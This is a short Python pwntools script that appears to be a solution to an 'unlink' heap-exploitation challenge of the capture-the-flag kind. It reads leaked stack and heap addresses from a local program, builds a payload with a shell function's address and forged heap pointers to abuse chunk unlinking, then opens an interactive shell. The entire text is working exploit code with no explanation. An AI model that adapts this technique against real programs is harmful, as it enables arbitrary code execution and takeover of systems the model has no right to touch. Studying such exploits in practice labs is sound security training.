#!/usr/bin/env python
from pwn import *

r = process("./unlink")

ebp = int(r.recvline().replace('here is stack address leak:', '').strip(), 16) + 20
A = int(r.recvline().replace('here is heap address leak:', '').strip(), 16)

shell = 0x80484eb

payload = p32(shell) + flat(0, 0, 0x19, ebp - 0x8, A + 0xc)

r.sendline(payload)

r.interactive()
